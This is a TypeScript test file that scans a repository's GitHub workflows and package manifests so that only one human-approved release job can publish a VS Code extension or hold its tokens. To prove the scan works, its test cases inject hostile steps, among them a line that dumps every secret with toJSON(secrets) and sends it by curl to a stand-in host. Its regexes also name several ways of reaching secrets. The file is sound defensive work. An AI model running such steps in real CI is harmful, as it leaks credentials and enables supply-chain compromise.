// @reads-the-tree
/**
 * ONE JOB PUBLISHES THE EXTENSION, BEHIND A PERSON'S APPROVAL, AND NOTHING ELSE DOES.
 *
 * The VS Code extension is published to the Visual Studio Marketplace and to Open VSX by one job of
 * `.github/workflows/release.yml`, `publish-vsix`, which asks for the `extension-stores` environment (a person
 * approves it there). The Marketplace is reached with no token: the job asks the runner for its OIDC token, signs
 * in to Microsoft Entra ID by hand (`az login --federated-token`, no action of a third party beside the token) and
 * `vsce --azure-credential` finds the session; Open VSX has no Entra ID, so `OVSX_PAT` is that environment's one
 * secret. Everywhere else the command that sends the file to a store, the credential that lets it (the Entra flag,
 * the sign-in, the request for the OIDC token, `OVSX_PAT`) and `VSCE_PAT` are refused: another workflow, another
 * job of that workflow, a job of it that does not ask for the environment, the header of the file, a package
 * script. `VSCE_PAT` is refused even in the one job: the Marketplace token is gone and a returning one is a defect.
 * Inside the one job: `id-token: write` is its (and the npm publish's) alone, the request for the OIDC token is one
 * step that comes after the hash check, `--azure-credential` is on a `vsce` line only, and no step uses an action
 * beyond the three it has.
 * This reads every workflow git carries (not `release.yml` by name only: the next one will not announce itself)
 * and every package manifest. The text is read comments included, so a token named in a comment is a token
 * named; a comment sits with the job that follows it.
 *
 * A guard that finds nothing is only worth something if it can find, so the cases below hand the scan the
 * defect it exists for: the publish in another job, the publish job without its environment, the same text
 * in another workflow, a token in a job that is not the one, the environment asked for by another job, the
 * versioned form of the command (`vsce@4.0.0 publish`), a secret reached by a computed name or all at once,
 * the Entra credential outside the one job, the Marketplace token back, `id-token` at the top or in another job, an
 * action beside the OIDC token, the request for the token before the hash check, a trigger that runs the
 * workflow with the base repository's secrets on a fork's code.
 * Each one must be refused.
 */

import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';

const ROOT = fileURLToPath(new URL('../../../', import.meta.url));

const TRACKED: readonly string[] = execFileSync(
  'git',
  ['ls-files', '--cached', '--others', '--exclude-standard'],
  { cwd: ROOT, encoding: 'utf-8', maxBuffer: 32 * 1024 * 1024 },
)
  .split('\n')
  .filter((where) => where !== '');

const WORKFLOWS = TRACKED.filter(
  (where) => where.startsWith('.github/workflows/') && /\.ya?ml$/.test(where),
);
const MANIFESTS = TRACKED.filter((where) => /(^|\/)package\.json$/.test(where));

/**
 * A command that publishes (bare, versioned as `vsce@4.0.0 publish`, or by the path of the installed binary), the
 * secret one needs, or the environment that holds them. Anywhere in the text, comments included.
 */
const PUBLISHES = new RegExp(
  [
    String.raw`\b(?:vsce|ovsx)["']?(?:@[\w.-]+)?["']?\s+(?:publish|login)\b`,
    String.raw`\bVSCE_PAT\b`,
    String.raw`\bOVSX_PAT\b`,
    String.raw`--azure-credential\b`,
    String.raw`\bverify-pat\b`,
    String.raw`\bACTIONS_ID_TOKEN_REQUEST`,
    String.raw`\baz\s+login\b`,
    String.raw`^\s*environment:\s*["']?extension-stores\b`,
    String.raw`\bname:\s*["']?extension-stores\b`,
  ].join('|'),
  'm',
);

/**
 * What no place may hold, the one job included: a way to reach a secret that does not name it (a computed name,
 * all of them, the whole set handed on), the Marketplace's personal access token (the Entra sign-in replaced it, and
 * a token that comes back is a defect), and a trigger that runs the workflow, secrets and all, on what a pull
 * request brings.
 */
const NEVER =
  /\bsecrets\s*(?:\[|\}\})|\btoJSON\(\s*secrets\b|\bsecrets:\s*inherit\b|\bVSCE_PAT\b|\bpull_request_target\b/;

/** The one place that may: the workflow, the job and the environment a person approves it in. */
const PLACE = {
  workflow: '.github/workflows/release.yml',
  job: 'publish-vsix',
  environment: 'extension-stores',
};

/** What precedes the jobs, and each job with the comment lines that sit right above its key. */
function jobsOf(text: string): { header: string; jobs: Map<string, string> } {
  const lines = text.split('\n');
  const keys: { name: string; at: number }[] = [];
  let inJobs = false;
  lines.forEach((line, at) => {
    if (/^jobs:\s*$/.test(line)) inJobs = true;
    const key = inJobs ? /^ {2}([a-z][\w-]*):\s*$/.exec(line) : null;
    if (key) keys.push({ name: key[1] as string, at });
  });
  const starts = keys.map(({ at }) => {
    let start = at;
    while (start > 0 && /^\s*#/.test(lines[start - 1] as string)) start--;
    return start;
  });
  const jobs = new Map<string, string>();
  keys.forEach(({ name }, i) => {
    jobs.set(name, lines.slice(starts[i], starts[i + 1] ?? lines.length).join('\n'));
  });
  return { header: lines.slice(0, starts[0] ?? lines.length).join('\n'), jobs };
}

/** The one install line the job may have: lockfile, no script, the release tools' own folder. */
const INSTALL_LINE = 'npm ci --ignore-scripts --no-audit --no-fund --prefix .github/release-tools';

/**
 * Why the install of the job is refused. In npm a later flag wins, so `--ignore-scripts --ignore-scripts=false`
 * runs the install scripts with the tokens' job around it: no `ignore-scripts=` and no `--foreground-scripts`
 * anywhere in the job, and every `npm ci` is the exact line.
 */
function installOffences(block: string): string[] {
  const found: string[] = [];
  if (/ignore-scripts\s*=/.test(block)) found.push('sets ignore-scripts with a value');
  if (/--foreground-scripts\b/.test(block)) found.push('asks for --foreground-scripts');
  for (const line of block.split('\n')) {
    const at = line.indexOf('npm ci');
    if (at >= 0 && !line.trim().startsWith('#') && !line.endsWith(`run: ${INSTALL_LINE}`)) {
      found.push(`an npm ci that is not the exact line: ${line.trim()}`);
    }
  }
  return found;
}

/** The three actions the publishing job may use, and no other (an action is code of a third party beside the token). */
const ACTIONS_OF_THE_JOB = ['actions/checkout@', 'actions/setup-node@', 'actions/download-artifact@'];

/** The jobs of `release.yml` that may hold `id-token: write`: the npm publish and the extension's. */
const MAY_HOLD_ID_TOKEN = ['publish', PLACE.job];

/** The steps of a job block, each from its `- ` line (the comment lines above a step stay with the step). */
function stepsOf(block: string): string[] {
  const at = block.search(/^ {4}steps:\s*$/m);
  if (at < 0) return [];
  return block
    .slice(at)
    .split(/^(?= {6}- )/m)
    .slice(1);
}

/** The sentence a `vsce` line may carry the Entra flag in: the installed binary, by path, `publish` or `verify-pat`. */
const VSCE_LINE = /release-tools\/node_modules\/\.bin\/vsce" (?:publish|verify-pat) /;

/** What the one job may not do with the Entra sign-in and the OIDC token; empty when it keeps to its fence. */
function theJobOffences(block: string): string[] {
  const found: string[] = [];
  if (!/^ {6}id-token: write$/m.test(block)) found.push('does not ask for id-token: write');
  for (const [, action] of block.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)) {
    if (!ACTIONS_OF_THE_JOB.some((ok) => (action as string).startsWith(ok))) {
      found.push(`uses ${action}, an action of a third party beside the OIDC token`);
    }
  }
  const steps = stepsOf(block);
  const asking = steps.filter((step) => /\bACTIONS_ID_TOKEN_REQUEST/.test(step));
  if (asking.length !== 1) found.push(`asks for the OIDC token in ${asking.length} steps, not one`);
  const check = block.indexOf('needs.vsix.outputs.sha256');
  const first = block.search(/\bACTIONS_ID_TOKEN_REQUEST/);
  if (check < 0 || (first >= 0 && first < check)) {
    found.push('asks for the OIDC token before it checks the file against the hash');
  }
  for (const line of block.split('\n')) {
    if (line.trim().startsWith('#')) continue;
    if (/--azure-credential\b/.test(line) && !VSCE_LINE.test(line)) {
      found.push(`has --azure-credential on a line that is not an installed vsce: ${line.trim()}`);
    }
  }
  return found;
}

/** Why a workflow is refused, in words; empty when it is clean. */
function offences(where: string, text: string): string[] {
  const never = NEVER.exec(text);
  if (never)
    return [`${where}: names ${never[0]}, a way to a secret or a trigger no place may use`];
  if (!PUBLISHES.test(text)) return [];
  if (where !== PLACE.workflow)
    return [`${where}: publishes the extension or holds a token for it`];
  const { header, jobs } = jobsOf(text);
  const found: string[] = [];
  if (PUBLISHES.test(header)) found.push(`${where}: its header names a publish or a token`);
  if (/^ {2}id-token:/m.test(header.replace(/^\s*#.*$/gm, ''))) {
    found.push(`${where}: its header gives id-token to every job`);
  }
  for (const [name, block] of jobs) {
    if (!MAY_HOLD_ID_TOKEN.includes(name) && /^ {6}id-token:/m.test(block)) {
      found.push(`${where}: job ${name} holds id-token, which only the two publishing jobs may`);
    }
    if (name === PLACE.job) {
      for (const why of theJobOffences(block)) found.push(`${where}: job ${name} ${why}`);
    }
    if (!PUBLISHES.test(block)) continue;
    if (name !== PLACE.job) {
      found.push(`${where}: job ${name} publishes the extension or holds a token for it`);
    } else if (!new RegExp(`^ {4}environment: ${PLACE.environment}$`, 'm').test(block)) {
      found.push(`${where}: job ${name} does not ask for the ${PLACE.environment} environment`);
    }
  }
  return found;
}

const RELEASE = readFileSync(join(ROOT, PLACE.workflow), 'utf-8');

describe('one job publishes the extension, behind an approval', () => {
  it('has no publish command or marketplace token in any workflow or package script but the one job', () => {
    const found = WORKFLOWS.flatMap((where) =>
      offences(where, readFileSync(join(ROOT, where), 'utf-8')),
    );
    expect(found, 'a file that publishes the extension, or holds a token for it').toEqual([]);
    const scripts = MANIFESTS.filter((where) =>
      PUBLISHES.test(readFileSync(join(ROOT, where), 'utf-8')),
    );
    expect(scripts, 'a package manifest that publishes the extension').toEqual([]);
  });

  it('is there: the job exists, asks for the environment, needs the packing job and publishes that file', () => {
    expect(WORKFLOWS).toContain(PLACE.workflow);
    const block = jobsOf(RELEASE).jobs.get(PLACE.job) ?? '';
    expect(block).toMatch(/^ {4}environment: extension-stores$/m);
    expect(block).toMatch(/^ {4}needs: \[plan, vsix\]$/m);
    expect(block).toMatch(/release-tools\/node_modules\/\.bin\/ovsx" publish --skip-duplicate /);
    // the token is in the environment of the step and nowhere else: not on a command line
    expect(block).not.toMatch(/\s-p\s|--pat\b/);
    expect(block).toMatch(/OVSX_PAT: \$\{\{ secrets\.OVSX_PAT \}\}/);
    expect(block).not.toMatch(/VSCE_PAT/);
    // the Marketplace is reached by the Entra session: verified, then published, by the installed binary
    expect(block).toMatch(/\.bin\/vsce" verify-pat --azure-credential mnema$/m);
    expect(block).toMatch(
      /\.bin\/vsce" publish --azure-credential --skip-duplicate --packagePath /,
    );
    expect(block).toMatch(/^ {6}id-token: write$/m);
    expect(block).toMatch(/--federated-token "\$token"/);
    expect(block).toMatch(/::add-mask::\$token/);
    expect(block).not.toMatch(/set -x|set -.*x|--oidc\b/);
    // the file is checked against the hash before the OIDC token is asked for and before either store is reached
    const code = block.replace(/^\s*#.*$/gm, '');
    const hash = code.indexOf('needs.vsix.outputs.sha256');
    expect(hash).toBeGreaterThan(-1);
    expect(hash).toBeLessThan(code.indexOf('ACTIONS_ID_TOKEN_REQUEST_URL'));
    expect(code.indexOf('ACTIONS_ID_TOKEN_REQUEST_URL')).toBeLessThan(code.indexOf('az login'));
    expect(code.indexOf('az login')).toBeLessThan(code.indexOf('verify-pat'));
    expect(code.indexOf('verify-pat')).toBeLessThan(code.indexOf('vsce" publish'));
    expect(hash).toBeLessThan(code.indexOf('OVSX_PAT: '));
    expect(theJobOffences(block)).toEqual([]);
    // the Entra identity is named by variables of the environment, and the one OIDC subject is that environment's
    expect(block).toMatch(/AZURE_CLIENT_ID: \$\{\{ vars\.AZURE_CLIENT_ID \}\}/);
    expect(block).toMatch(/AZURE_TENANT_ID: \$\{\{ vars\.AZURE_TENANT_ID \}\}/);
  });

  it('installs the two command lines from the lockfile with no script and no secret, and resolves nothing after', () => {
    const block = jobsOf(RELEASE).jobs.get(PLACE.job) ?? '';
    const install = block.indexOf('npm ci --ignore-scripts');
    expect(install, 'the install step').toBeGreaterThan(-1);
    expect(installOffences(block)).toEqual([]);
    expect(block.slice(install)).toMatch(
      /^ {8}run: npm ci --ignore-scripts .*--prefix \.github\/release-tools$/m,
    );
    // every secret comes after the install, and no step resolves a package from the registry
    expect(install).toBeLessThan(block.indexOf('${{ secrets.'));
    expect(block).not.toMatch(/\bnpx\b|\bnpm (?:install|i|exec|x)\b|\bpnpm (?:dlx|add|install)\b/);
    const tools = JSON.parse(
      readFileSync(join(ROOT, '.github/release-tools/package.json'), 'utf-8'),
    ) as {
      dependencies: Record<string, string>;
    };
    expect(tools.dependencies).toEqual({ '@vscode/vsce': '4.0.0', ovsx: '1.3.0' });
    const lock = JSON.parse(
      readFileSync(join(ROOT, '.github/release-tools/package-lock.json'), 'utf-8'),
    ) as {
      packages: Record<string, { integrity?: string; link?: boolean }>;
    };
    const without = Object.entries(lock.packages).filter(
      ([name, entry]) => name !== '' && !entry.link && entry.integrity === undefined,
    );
    expect(
      without.map(([name]) => name),
      'a locked package with no integrity',
    ).toEqual([]);
  });

  it('refuses an install that turns the scripts back on, by a later flag or by another form', () => {
    const block = jobsOf(RELEASE).jobs.get(PLACE.job) ?? '';
    expect(installOffences(block)).toEqual([]);
    for (const tail of [
      ' --ignore-scripts=false',
      ' --foreground-scripts',
      ' --ignore-scripts=false --ignore-scripts',
    ]) {
      const mutated = block.replace(
        `${INSTALL_LINE}`,
        `npm ci --ignore-scripts${tail} --no-audit --no-fund --prefix .github/release-tools`,
      );
      expect(mutated, tail).not.toBe(block);
      expect(installOffences(mutated), tail).not.toEqual([]);
    }
    const twice = block.replace(
      INSTALL_LINE,
      'npm ci --ignore-scripts --ignore-scripts=false --prefix .github/release-tools',
    );
    expect(installOffences(twice)).not.toEqual([]);
  });

  it('still packs the extension in CI and keeps the file, so the scan has something to refuse', () => {
    const ci = readFileSync(join(ROOT, '.github/workflows/ci.yml'), 'utf-8');
    expect(ci).toMatch(/run: pnpm --filter @mnema\/vscode package\b/);
    expect(ci).toMatch(/path: packages\/vscode\/mnema-\*\.vsix/);
    expect(WORKFLOWS).toContain('.github/workflows/ci.yml');
  });

  it('refuses the publish in a job that is not the one', () => {
    const moved = RELEASE.replace(/^ {2}publish-vsix:$/m, '  publish-the-extension:');
    expect(offences(PLACE.workflow, moved)).toEqual([
      `${PLACE.workflow}: job publish-the-extension holds id-token, which only the two publishing jobs may`,
      `${PLACE.workflow}: job publish-the-extension publishes the extension or holds a token for it`,
    ]);
    const extra = `${RELEASE}\n  another:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: npx ovsx publish x.vsix\n`;
    expect(offences(PLACE.workflow, extra)).toEqual([
      `${PLACE.workflow}: job another publishes the extension or holds a token for it`,
    ]);
  });

  it('refuses the publish job without its environment', () => {
    const bare = RELEASE.replace(/^ {4}environment: extension-stores$/m, '');
    expect(offences(PLACE.workflow, bare)).toEqual([
      `${PLACE.workflow}: job ${PLACE.job} does not ask for the ${PLACE.environment} environment`,
    ]);
  });

  it('refuses a token in the header of the workflow, in another job, or in another workflow', () => {
    expect(offences(PLACE.workflow, `# the token is OVSX_PAT\n${RELEASE}`)).toEqual([
      `${PLACE.workflow}: its header names a publish or a token`,
    ]);
    const leaked = RELEASE.replace(/^ {2}vsix:\n/m, '  vsix:\n    env:\n      TOKEN: x OVSX_PAT\n');
    expect(offences(PLACE.workflow, leaked)).toEqual([
      `${PLACE.workflow}: job vsix publishes the extension or holds a token for it`,
    ]);
    expect(offences('.github/workflows/ci.yml', RELEASE)).toEqual([
      '.github/workflows/ci.yml: publishes the extension or holds a token for it',
    ]);
  });

  it('refuses the environment asked for by a job that is not the one, in this workflow or another', () => {
    const asked = (name: string) =>
      `  ${name}:\n    runs-on: ubuntu-24.04\n    environment: extension-stores\n    steps:\n      - run: true\n`;
    expect(offences('.github/workflows/ci.yml', `jobs:\n${asked('leak')}`)).toEqual([
      '.github/workflows/ci.yml: publishes the extension or holds a token for it',
    ]);
    expect(offences(PLACE.workflow, `${RELEASE}\n${asked('leak')}`)).toEqual([
      `${PLACE.workflow}: job leak publishes the extension or holds a token for it`,
    ]);
    const named = '  leak:\n    environment:\n      name: extension-stores\n    steps: []\n';
    expect(offences(PLACE.workflow, `${RELEASE}\n${named}`)).toEqual([
      `${PLACE.workflow}: job leak publishes the extension or holds a token for it`,
    ]);
  });

  it('refuses the versioned form of the command, wherever it is', () => {
    const versioned = '      - run: npx --yes @vscode/vsce@4.0.0 publish --packagePath x.vsix\n';
    const other = `jobs:\n  another:\n    runs-on: ubuntu-24.04\n    steps:\n${versioned}`;
    expect(offences('.github/workflows/ci.yml', other)).toEqual([
      '.github/workflows/ci.yml: publishes the extension or holds a token for it',
    ]);
    const inVsix = RELEASE.replace(/^ {6}- name: Install that file in VS Code/m, `${versioned}$&`);
    expect(inVsix).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, inVsix)).toEqual([
      `${PLACE.workflow}: job vsix publishes the extension or holds a token for it`,
    ]);
    const bin = '      - run: .github/release-tools/node_modules/.bin/ovsx publish x.vsix\n';
    expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n    steps:\n${bin}`)).toHaveLength(1);
  });

  it('refuses a secret reached by a computed name or all at once, even in the one job', () => {
    const computed = `      - run: echo "\${{ secrets[format('OVSX_{0}', 'P')] }}"\n`;
    const dumped = `      - run: echo '\${{ toJSON(secrets) }}' | curl -d @- https://example.test\n`;
    const inherited = '    secrets: inherit\n';
    for (const [step, job] of [
      [computed, 'vsix'],
      [dumped, 'vsix'],
      [computed, PLACE.job],
      [dumped, PLACE.job],
    ] as const) {
      const at = new RegExp(`^ {2}${job}:\\n(?:.*\\n)*? {4}steps:\\n`, 'm');
      const mutated = RELEASE.replace(at, (head) => `${head}${step}`);
      expect(mutated, `${job} got the step`).not.toBe(RELEASE);
      expect(offences(PLACE.workflow, mutated), `${job}: ${step}`).toHaveLength(1);
    }
    expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n${inherited}`)).toHaveLength(1);
    expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n    steps:\n${dumped}`)).toHaveLength(
      1,
    );
  });

  it('refuses a trigger that runs the workflow on what a pull request brings', () => {
    const trigger = RELEASE.replace(/^on:\n/m, 'on:\n  pull_request_target:\n');
    expect(trigger).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, trigger)).toHaveLength(1);
  });

  it('refuses the Entra credential, the sign-in and the OIDC token outside the one job, and the Marketplace token anywhere', () => {
    expect(offences(PLACE.workflow, RELEASE)).toEqual([]);
    for (const step of [
      '      - run: vsce publish --azure-credential\n',
      '      - run: vsce verify-pat --azure-credential mnema\n',
      '      - run: az login --federated-token "$t"\n',
      '      - run: curl "$ACTIONS_ID_TOKEN_REQUEST_URL"\n',
    ]) {
      const elsewhere = RELEASE.replace(/^ {6}- name: Install that file in VS Code/m, `${step}$&`);
      expect(elsewhere, step).not.toBe(RELEASE);
      expect(offences(PLACE.workflow, elsewhere), step).toEqual([
        `${PLACE.workflow}: job vsix publishes the extension or holds a token for it`,
      ]);
      expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n    steps:\n${step}`), step).toEqual(
        ['.github/workflows/ci.yml: publishes the extension or holds a token for it'],
      );
    }
    // the Marketplace token, back in the one job or anywhere, is refused as a way to a secret no place may use
    const back = RELEASE.replace(/^( {10}VERSION: .*\n)( {8}run: \|\n {10}set -euo pipefail\n {10}served=)/m, '$1          VSCE_PAT: ${{ secrets.VSCE_PAT }}\n$2');
    expect(back).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, back)).toHaveLength(1);
    expect(offences('.github/workflows/ci.yml', 'env:\n  T: ${{ secrets.VSCE_PAT }}\n')).toHaveLength(1);
  });

  it('refuses the Entra flag in the one job on a line that is not the installed vsce', () => {
    const onOvsx = RELEASE.replace(
      /release-tools\/node_modules\/\.bin\/ovsx" publish /,
      '$&--azure-credential ',
    );
    expect(onOvsx).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, onOvsx).join('\n')).toMatch(
      /job publish-vsix has --azure-credential on a line that is not an installed vsce/,
    );
    const npx = RELEASE.replace(
      /^ {6}- name: Publish to Open VSX/m,
      '      - run: npx @vscode/vsce publish --azure-credential\n$&',
    );
    expect(npx).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, npx).join('\n')).toMatch(/is not an installed vsce/);
  });

  it('refuses id-token at the top of the workflow or in a job that is not one of the two that publish', () => {
    const top = RELEASE.replace(/^permissions:\n {2}contents: read\n/m, '$&  id-token: write\n');
    expect(top).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, top)).toEqual([
      `${PLACE.workflow}: its header gives id-token to every job`,
    ]);
    const other = RELEASE.replace(
      /^( {2}attach-vsix:\n(?:.*\n)*? {4}permissions:\n)/m,
      '$1      id-token: write\n',
    );
    expect(other).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, other)).toEqual([
      `${PLACE.workflow}: job attach-vsix holds id-token, which only the two publishing jobs may`,
    ]);
    const without = jobsOf(RELEASE)
      .jobs.get(PLACE.job)
      ?.replace(/^ {6}id-token: write\n/m, '');
    expect(theJobOffences(without ?? '')).toContain('does not ask for id-token: write');
  });

  it('refuses an action beside the OIDC token, and the token asked for before the hash is checked', () => {
    const azureLogin = RELEASE.replace(
      /^ {6}- name: Sign in to Microsoft Entra ID/m,
      '      - uses: azure/login@v2\n        with:\n          client-id: x\n$&',
    );
    expect(azureLogin).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, azureLogin)).toEqual([
      `${PLACE.workflow}: job ${PLACE.job} uses azure/login@v2, an action of a third party beside the OIDC token`,
    ]);
    const early = RELEASE.replace(
      /^ {6}- name: Check the file against the hash the pack job exposes/m,
      '      - run: curl "$ACTIONS_ID_TOKEN_REQUEST_URL"\n$&',
    );
    expect(early).not.toBe(RELEASE);
    expect(offences(PLACE.workflow, early).join('\n')).toMatch(
      /asks for the OIDC token before it checks the file against the hash/,
    );
    expect(offences(PLACE.workflow, early).join('\n')).toMatch(/in 2 steps, not one/);
  });
});
